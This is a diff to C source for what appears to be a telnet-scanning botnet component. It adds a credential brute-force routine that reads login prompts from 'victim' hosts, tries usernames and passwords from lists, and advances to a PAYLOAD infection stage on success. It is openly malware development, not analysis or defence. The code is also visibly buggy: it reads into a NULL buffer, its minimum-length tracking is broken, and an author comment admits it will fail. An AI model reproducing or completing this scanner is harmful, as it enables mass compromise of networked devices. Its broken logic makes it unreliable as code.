@@ -97,12 +97,21 @@ bool scan_negotiate(int sock, unsigned char *buf, int len) {
 	return true;
 }
 
-bool scan_readuntil(int sock, char *str)
+bool scan_readuntil(const int32_t sock, const char **strs)
 {
-	int16_t i;
-	uint8_t pos = 0;
-	int8_t len = strlen(str);
+	int16_t i = 0, maxlen = -1, minlen = -1;
 	unsigned char *buf = NULL;
+
+	while (*strs)
+	{
+		int16_t _len = strlen(*strs++);
+		if (_len > maxlen)
+			maxlen = _len;
+		if (_len < minlen)
+			minlen = _len;
+	}
+	unsigned char mbuf[maxlen + 100];
+
 	while (1)
 	{
 		if (recv(sock, buf, 1, 0) < 0) // Read 1 from socket
@@ -110,18 +119,25 @@ bool scan_readuntil(int sock, char *str)
 		if (*buf == TELNET_CMD)
 		{
 			uint8_t longbuf[4];
-			if ((i = recv(sock, longbuf, 3, 0)) <= 0)
+			if (recv(sock, longbuf, 3, 0) <= 0)
 				return false;
 			scan_negotiate(sock, longbuf, 3);
 		}
-		else if(*buf == str[pos])
-		{
-			if (pos++ == len)
-				return true;
-		}
 		else
-			pos = 0;
+		{
+			mbuf[i] = *buf;
+		}
+		if (i >= minlen)
+		{
+			while (*strs)
+			{
+				if (subcasestr((const char *)mbuf, *strs++) != -1)
+					return true;
+			}
+		}
+		i++;
 	}
+	return false;
 }
 
 bool scan_scanner(void)
@@ -336,11 +352,57 @@ skip:
 					}
 					then go readuntil(sock, userwords)
 					*/
-					scan_readuntil(victim_table[i].sock, "login");
+					if (scan_readuntil(victim_table[i].sock, userprompts) == false)
+						victim_table[i].state = FINISHED;
+
+					if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
+					{
+						victim_table[i].state = FINISHED;
+						break;
+					}
+
+					if (scan_readuntil(victim_table[i].sock, failstrs) == true)
+					{
+						if (victim_table[i].user++ >= usersize)
+						{
+							victim_table[i].state = FINISHED;
+							break;
+						}
+					}
+					else
+						victim_table[i].state = PASSWORD;
+/*
+	HEY! This won't work because we will read the password prompt when we try to read for failstrs 
+	this means the next scan_readuntil will 100% fail! 
+	YAYYYYY
+*/
 				}
 				case PASSWORD:
 				{
+					if (scan_readuntil(victim_table[i].sock, passprompts) == false)
+						victim_table[i].state = FINISHED;
 
+					if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
+					{
+						victim_table[i].state = FINISHED;
+						break;
+					}
+
+					if (scan_readuntil(victim_table[i].sock, failstrs) == true)
+						if (victim_table[i].pass++ >= passsize)
+						{
+							victim_table[i].pass = 0;
+							if (victim_table[i].user++ >= usersize)
+							{
+								victim_table[i].state = FINISHED;
+								break;
+							}
+							victim_table[i].state = USERNAME;
+						}
+						else
+							break;
+					else
+						victim_table[i].state = PAYLOAD;
 				}
 				case PAYLOAD:
 				{
